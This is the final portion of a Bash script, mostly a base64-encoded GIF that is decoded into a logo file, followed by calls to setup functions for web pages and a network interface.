44m2cT44sAWUpxzdWtAAe10ub86y17H1lasfNECBK3yBAtGmABcosIEaY5bmPF3vI/+tTodnwApa
sMLCHe5wZKvx5XneggauQGOQ60PQJNg610ngda6XoAQF0Aehy07fnnMBDFyQ9to1gOP4NvKyNW80
3XGsRqFjNrP5QEPKr0BudG+BAy+P+T0mK3FPd9seul78PhbvgSxoQQIa6APZiW3seyAbe/AVtmVL
cFkS1OELFh9BokEecq2nXvVa53q2sz0CMIDhC6Of/Re28IW929e+7Y170G3/vGjM6v3kGqg6yjVA
fA34WY0FeCbzS+/YiD99e3zIQhaqsAY+SP/gPJ1sZrFe4w3I/udkJ3QBxl72ApBgH2UfOwlKwPqy
e13kJOgAGCgg+w7UXvamV/SM55vj/iO5RSM0P7i/L9iA2Qs/CugAkqM5mfMz7tM9CeQAltMCNJBA
DOSpfnCxy4oxa6Ov2iuD0vM4EhQ5j2s9FOS6slu9NNiANEiDDtiAn9uADTjB9yo/HLxBsnu/r1tB
rSO7AigDCiiDAywDIjxCD5ys7oPA94ovfcAHfdgHNZLCAtiH+PKA4xvC+CIBuuqHLuQpfrAvbjM/
+tqH99qH/NsAImTA9DNB/x9UwdTrwR5cQff7OvprvRgsgxbsAPRLP9c7PUAMxPcyQiNkwA4gxDIA
wm2zLhL4MwJswgjMPeHTAA4YAw7IQAycr9JTNJArgUMsAREsgbB7P7HTh1I8xfUrgfVTP1NcRVfU
uhJQQxpMA1FcwTYkvxuEPzucQ9XbgA6IQTDgw1+kwV/0uA+kMU1UQmVcRg44vuNbRmhUwn6osX0o
vbHzw/c6xF8sRvh7Q9YDu9XTRR7kQfojRmKUQ1IURVGsQ7Fzv3VMx7LzxTzsAPorg18UwdO7NkQb
w0Y0xfjahz/7vBHwRQ2gxUCzwgLYwBGYxoXMMY+7RjOsQn3oAE9sQUBQv/+v24eve0f260j360hT
DDuvez891EZ7VMFd7MZwtMN3/DoXLMn464AXTIMy+DrzO7/3S7/y8zZsK70C+AObC8o/OEai5ERB
dL17tEc+rEVRND9CK0U5BMePnMp3HEZZ9ERVdD+NVEWx24eu1Er1U0d1HMZfrEX6G4EOoC82PEq2
/LgRqIM6eEufbMuEfC9+OMMz3LqJTEu05MZd/EvAtMOy20rC1EqyjEG0JEdvXEyUZL1t3EY75MsP
XMusc70fNMUdfC9P/AOK/AP16zZ+KL1+eK/RrMs/RMGbjEKsXE3108h9cE3YbE3ZzEra9Ep3JAF5
zM2y3MjAdEd15M2vO0z/ExBFjaRB46TBdkxOsTQ/M3Q/XCwAyURLujzKcIw/+ntMeuxN7dTO5CzH
1aRI4vTK11TF1yzP8RRPE8DN61xH28RN7OzL6ozPH4xOo5zOftC6+9SHfuC6fhBFfiBO+hPF7KxD
AlXO2zTQ2tzIX7xOBr1IluxNsYtQUaTB4LTOHszOBV1QsSzQjSTOdKRHT1S/9BtNEiDR/DzRldTF
DsVI8GxRD4jN15TNGI1RruTK8iyB9CSB4dTRDSVP8xRPIOXKAx3O89zKDdXRAF2/14zCVCzMssNO
spPP6txO7VxQwJRQLM1SLY3Qv9RIDmVHr6xR28zRlhTTdcxQ7NxGCwXM/73EzjWl0q/rzxKQUzr1
yn6wU43sh/QcU08cTib90xeVURgFUvcbTvI0AUNN1K5cVIxEUkcNU37wykgV0nbcBxPoAA+4VEv9
0yVdUhNAwxLwgA4wAX5Qv/3ch1PtT1QVOzrd0iwNU1jdU1HcUQTNyCAt0q70yh39VPJUxfREVB7V
0V8dVmFtzV4t0gMN03fs0Zb8Ut901S39UWmdVvM0VGjNVWqVViz90Wt11WwdTwk1z26N1m8tV394
zXPdh3RdV6881zm10/+80xLVSH7wABKIVPX7T37oz30tgX7dh/9EVR1V1TtF1de8U38Vu/9MWIYt
WIc9WIj1V3qF1znV1/9SDVSANVVT9Vd+JVhV9IePRVeRVddyLVlqTdRPNVlxBdKSTVlVfFGVFVds
PVktTdmYNVl+iFSAfc2cNc+c1VmfvdlpBdrzJFVqjVSkJVqi/dGe3Vmk5VmmHdqohdqkfdryVFqe
5Qd/yNmt1Vqu5dp+0Nqw9YexDdt+uNOzRVW0XVu1bdu0Pdt9Pdd9Bdiurduv9Vq8tdu8LVux3Vez
Zdu3BVzBVdu4Ldx+0Fu9DdufXVzGbVzHfVzIjVyllVzKrVzLvVzMzVzN3VzO7VzP/VzJJdvDPVvR
JVuxHV3ULd2zXV3WbV3XTV3SjV3YnV3VpV3Zrd3afV3dZV3RNVvcLdvJ0T3d3t1d4i1e4z1e5E1e
5V1e5m1e531e6I1e6ZXe37Vd6y1dsvWH7N3e2+3e6/Xe6g1f8CVd7tXewxXf77Xe6V1f9m1f931f
+I1f+W1f9K3f2y1f7k1f+9Xf8b1e/D3f/t3f3J1fAi5gA0bd1c3e0dXe7TVfBU7d3nXg/D1fBkbg
BCZf8mXg/FVd7DXfBfbgD9bgDAbhEUZgEFZgD25gDV5hFm5hF35hGI5hGZ5hGq5hG75hHM5hHd5h
Hu5hH/5hIA5iIR5iFg4IADs=" | base64 -d >$DUMP_PATH/data/logo.gif

}

error && final && index && info && style && style2 && imagesbas64


}

######################################### < INTERFACES WEB > ########################################

mostrarheader
checkprivilegies && setresolution && setinterface